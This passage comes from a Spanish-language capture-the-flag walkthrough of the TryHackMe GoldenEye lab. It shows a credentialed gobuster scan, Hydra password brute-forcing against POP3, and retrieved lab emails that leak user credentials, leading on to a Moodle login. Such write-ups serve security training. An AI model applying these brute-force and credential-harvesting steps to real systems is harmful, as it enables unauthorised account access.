  &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;00:03:25&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;########################################   18444/18444   ETA: 00:00:00 req/s: 89&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Ended at: 2020-08-05 17:17:20

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizando GOBUSTER con las credenciales realizamos una busqueda de paginas y directorios en &lt;code&gt;/sev-home/&lt;/code&gt; pero no encontramos nada interesante.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@upset:~/thm/goldeneye# gobuster dir -u http://golden.thm/sev-home/ -w /usr/share/wordlists/dirb/common.txt -P [... REDACTED ...] -U boris -q -t 50 -x php,html,txt
/index.html (Status: 200)
/index.html (Status: 200)
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;pop3---hydra&#34;&gt;POP3 - HYDRA&lt;/h2&gt;
&lt;p&gt;Intentamos reutilizar la contraseña junto con los usuarios que encontramos en este servicio pero no funcionaron, por lo que utilizamos hydra para hacer un ataque de fuerza bruta junto con los usuarios y el wordlist rockyou.&lt;/p&gt;
&lt;p&gt;Despues de realizar mas de diez mil intentos no encontramos alguna contraseña (raro en una maquina de THM) con el wordlist rockyou cambiamos de wordlist a uno más pequeño, con el cual encontramos credenciales para los usuarios &lt;code&gt;boris&lt;/code&gt; y &lt;code&gt;natalya&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_172650.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;boris---email&#34;&gt;BORIS - EMAIL&lt;/h3&gt;
&lt;p&gt;Utilizamos las credenciales para leer los correos de boris al igual que en &lt;a href=&#34;https://sckull.github.io/posts/fowsniff/#hydratelnet---pop3&#34;&gt;&lt;strong&gt;Fowsniff CTF - THM&lt;/strong&gt;&lt;/a&gt;, encontramos otros usuarios &lt;code&gt;xenia&lt;/code&gt; y &lt;code&gt;alec&lt;/code&gt;. En los correos hablan sobre codigos de &lt;code&gt;boris&lt;/code&gt;, estos codigos &lt;code&gt;natalya&lt;/code&gt; ha podido romper. Tambien sobre un archivo escondido en el servidor.&lt;/p&gt;

&lt;div id=&#34;5eef4290c6bb646f&#34; class=&#34;codetab&#34;&gt;
  &lt;div class=&#34;codetab__links&#34;&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;correo1&lt;/button&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;correo2&lt;/button&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;correo3&lt;/button&gt;
    
  &lt;/div&gt;
  
  
&lt;div id=&#34;868e3051d5f7d3d0&#34; class=&#34;codetab__content&#34;&gt;
  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;  RETR &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
  +OK &lt;span class=&#34;m&#34;&gt;544&lt;/span&gt; octets
  Return-Path: &amp;lt;root@127.0.0.1.goldeneye&amp;gt;
  X-Original-To: boris
  Delivered-To: boris@ubuntu
  Received: from ok &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;localhost &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;127.0.0.1&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
      by ubuntu &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Postfix&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; with SMTP id D9E47454B1
      &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &amp;lt;boris&amp;gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Tue, &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;1990&lt;/span&gt; 19:22:14 -0700 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  Message-Id: &amp;lt;20180425022326.D9E47454B1@ubuntu&amp;gt;
  Date: Tue, &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;1990&lt;/span&gt; 19:22:14 -0700 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  From: root@127.0.0.1.goldeneye

  Boris, this is admin. You can electronically communicate to co-workers and students here. I&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;m not going to scan emails &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; security risks because I trust you and the other admins here.
  .
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;

  
&lt;div id=&#34;a1f02858a963a83e&#34; class=&#34;codetab__content&#34;&gt;
  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;  RETR &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
  +OK &lt;span class=&#34;m&#34;&gt;373&lt;/span&gt; octets
  Return-Path: &amp;lt;natalya@ubuntu&amp;gt;
  X-Original-To: boris
  Delivered-To: boris@ubuntu
  Received: from ok &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;localhost &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;127.0.0.1&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
      by ubuntu &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Postfix&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; with ESMTP id C3F2B454B1
      &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &amp;lt;boris&amp;gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Tue, &lt;span class=&#34;m&#34;&gt;21&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;1995&lt;/span&gt; 19:42:35 -0700 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  Message-Id: &amp;lt;20180425024249.C3F2B454B1@ubuntu&amp;gt;
  Date: Tue, &lt;span class=&#34;m&#34;&gt;21&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;1995&lt;/span&gt; 19:42:35 -0700 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  From: natalya@ubuntu

  Boris, I can &lt;span class=&#34;nb&#34;&gt;break&lt;/span&gt; your codes!
  .
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;

  
&lt;div id=&#34;e7bbc02929a47abd&#34; class=&#34;codetab__content&#34;&gt;
  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;  RETR &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
  +OK &lt;span class=&#34;m&#34;&gt;921&lt;/span&gt; octets
  Return-Path: &amp;lt;alec@janus.boss&amp;gt;
  X-Original-To: boris
  Delivered-To: boris@ubuntu
  Received: from janus &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;localhost &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;127.0.0.1&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
      by ubuntu &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Postfix&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; with ESMTP id 4B9F4454B1
      &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &amp;lt;boris&amp;gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Wed, &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;1995&lt;/span&gt; 19:51:48 -0700 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  Message-Id: &amp;lt;20180425025235.4B9F4454B1@ubuntu&amp;gt;
  Date: Wed, &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;1995&lt;/span&gt; 19:51:48 -0700 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  From: alec@janus.boss

  Boris,

  Your cooperation with our syndicate will pay off big. Attached are the final access codes &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; GoldenEye. Place them in a hidden file within the root directory of this server &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt; remove from this email. There can only be one &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; of these acces codes, and we need to secure them &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the final execution. If they are retrieved and captured our plan will crash and burn!

  Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

  PS - Keep security tight or we will be compromised.

  .
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;


&lt;/div&gt;

&lt;script&gt;
  &#39;use strict&#39;;

  var containerId = JSON.parse(&#34;\&#34;5eef4290c6bb646f\&#34;&#34;);
  var containerElem = document.getElementById(containerId);
  var codetabLinks = null;
  var codetabContents = null;
  var ids = [];

  if (containerElem) {
    codetabLinks = containerElem.querySelectorAll(&#39;.codetab__link&#39;);
    codetabContents = containerElem.querySelectorAll(&#39;.codetab__content&#39;);
  }

  for (var i = 0; i &lt; codetabContents.length; i++) {
    ids = ids.concat(codetabContents[i].getAttribute(&#39;id&#39;));
    codetabContents[i].style.display = &#39;none&#39;;

    if (0 === parseInt(i, 10) &amp;&amp; !codetabContents[i].classList.contains(&#39;active&#39;)) {
      codetabContents[i].classList.add(&#39;active&#39;);
    }
  }

  for (var i = 0; i &lt; codetabLinks.length; i++) {
    codetabLinks[i].setAttribute(&#39;id&#39;, ids[i]);

    if (0 === parseInt(i, 10) &amp;&amp; !codetabLinks[i].classList.contains(&#39;active&#39;)) {
      codetabLinks[i].classList.add(&#39;active&#39;);
    } else {
      codetabLinks[i].classList.remove(&#39;active&#39;);
    }
  }

  if (codetabContents.length &gt; 0) {
    codetabContents[0].style.display = &#39;block&#39;;
  }
&lt;/script&gt;
&lt;h3 id=&#34;natalya---email&#34;&gt;NATALYA - EMAIL&lt;/h3&gt;
&lt;p&gt;Utilizamos neuvamente telnet pero esta vez con las credenciales de &lt;code&gt;natalya&lt;/code&gt;, encontramos en uno de los correos las credenciales del usuario &lt;code&gt;xenia&lt;/code&gt;.&lt;/p&gt;

&lt;div id=&#34;ddf4a8c14cc81176&#34; class=&#34;codetab&#34;&gt;
  &lt;div class=&#34;codetab__links&#34;&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;correo1&lt;/button&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;correo2&lt;/button&gt;
    
  &lt;/div&gt;
  
  
&lt;div id=&#34;c735969fd5a60a85&#34; class=&#34;codetab__content&#34;&gt;
  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;  RETR &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
  +OK &lt;span class=&#34;m&#34;&gt;631&lt;/span&gt; octets
  Return-Path: &amp;lt;root@ubuntu&amp;gt;
  X-Original-To: natalya
  Delivered-To: natalya@ubuntu
  Received: from ok &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;localhost &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;127.0.0.1&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
  by ubuntu &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Postfix&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; with ESMTP id D5EDA454B1
  &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &amp;lt;natalya&amp;gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Tue, &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;1995&lt;/span&gt; 19:45:33 -0700 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  Message-Id: &amp;lt;20180425024542.D5EDA454B1@ubuntu&amp;gt;
  Date: Tue, &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;1995&lt;/span&gt; 19:45:33 -0700 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  From: root@ubuntu

  Natalya, please you need to stop breaking boris&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt; codes. Also, you are GNO supervisor &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; training. I will email you once a student is designated to you.

  Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
  .
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
  
&lt;div id=&#34;34f1b3d1c5e45312&#34; class=&#34;codetab__content&#34;&gt;
  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;  RETR &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
  +OK &lt;span class=&#34;m&#34;&gt;1048&lt;/span&gt; octets
  Return-Path: &amp;lt;root@ubuntu&amp;gt;
  X-Original-To: natalya
  Delivered-To: natalya@ubuntu
  Received: from root &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;localhost &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;127.0.0.1&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
      by ubuntu &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Postfix&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; with SMTP id 17C96454B1
      &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &amp;lt;natalya&amp;gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Tue, &lt;span class=&#34;m&#34;&gt;29&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;1995&lt;/span&gt; 20:19:42 -0700 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  Message-Id: &amp;lt;20180425031956.17C96454B1@ubuntu&amp;gt;
  Date: Tue, &lt;span class=&#34;m&#34;&gt;29&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;1995&lt;/span&gt; 20:19:42 -0700 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PDT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
  From: root@ubuntu

  Ok Natalyn I have a new student &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; you. As this is a new system please &lt;span class=&#34;nb&#34;&gt;let&lt;/span&gt; me or boris know &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; you see any config issues, especially is it&lt;span class=&#34;s1&#34;&gt;&amp;#39;s related to security...even if it&amp;#39;&lt;/span&gt;s not, just enter it in under the guise of &lt;span class=&#34;s2&#34;&gt;&amp;#34;security&amp;#34;&lt;/span&gt;...it&lt;span class=&#34;s1&#34;&gt;&amp;#39;ll get the change order escalated without much hassle :)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  Ok, user creds are:
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  username: xenia
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  password: [... REDACTED ...]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  Boris verified her as a valid contractor so just create the account ok?
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  And if you didn&amp;#39;&lt;/span&gt;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir
  **Make sure to edit your host file since you usually work remote off-network....

  Since you&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
  .
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;/div&gt;

&lt;script&gt;
  &#39;use strict&#39;;

  var containerId = JSON.parse(&#34;\&#34;ddf4a8c14cc81176\&#34;&#34;);
  var containerElem = document.getElementById(containerId);
  var codetabLinks = null;
  var codetabContents = null;
  var ids = [];

  if (containerElem) {
    codetabLinks = containerElem.querySelectorAll(&#39;.codetab__link&#39;);
    codetabContents = containerElem.querySelectorAll(&#39;.codetab__content&#39;);
  }

  for (var i = 0; i &lt; codetabContents.length; i++) {
    ids = ids.concat(codetabContents[i].getAttribute(&#39;id&#39;));
    codetabContents[i].style.display = &#39;none&#39;;

    if (0 === parseInt(i, 10) &amp;&amp; !codetabContents[i].classList.contains(&#39;active&#39;)) {
      codetabContents[i].classList.add(&#39;active&#39;);
    }
  }

  for (var i = 0; i &lt; codetabLinks.length; i++) {
    codetabLinks[i].setAttribute(&#39;id&#39;, ids[i]);

    if (0 === parseInt(i, 10) &amp;&amp; !codetabLinks[i].classList.contains(&#39;active&#39;)) {
      codetabLinks[i].classList.add(&#39;active&#39;);
    } else {
      codetabLinks[i].classList.remove(&#39;active&#39;);
    }
  }

  if (codetabContents.length &gt; 0) {
    codetabContents[0].style.display = &#39;block&#39;;
  }
&lt;/script&gt;
&lt;h1 id=&#34;goldeneye-part-2&#34;&gt;GOLDENEYE PART 2&lt;/h1&gt;
&lt;p&gt;Agregamos el siguiente dominio &lt;code&gt;severnaya-station.com&lt;/code&gt; a nuestro archiv &lt;code&gt;/etc/hosts&lt;/code&gt; junto a la IP de la maquina, y nos dirigimos a &lt;code&gt;/gnocertdir&lt;/code&gt;. Encontramos lo que parece ser la plataforma &lt;strong&gt;Moodle&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_173213.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos las credenciales de xenia para ingresar. En los mensajes de xenia encontramos un mensaje de &lt;code&gt;doak&lt;/code&gt; (nuevo nombre de usuario) en donde habla sobre un curso en el que xenia esta involucrada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_173700.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;doak---hydra---pop3&#34;&gt;DOAK - HYDRA -&amp;gt; POP3&lt;/h3&gt;
&lt;p&gt;Nuevamente utilizamos hydra con el usuario &lt;code&gt;doak&lt;/code&gt; en el puerto de pop3 (55007). Logramos obtener su contraseña.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/goldeneye/Screenshot_20200805_173854.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al revisar uno de sus correos encontramos su usario y contraseña:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
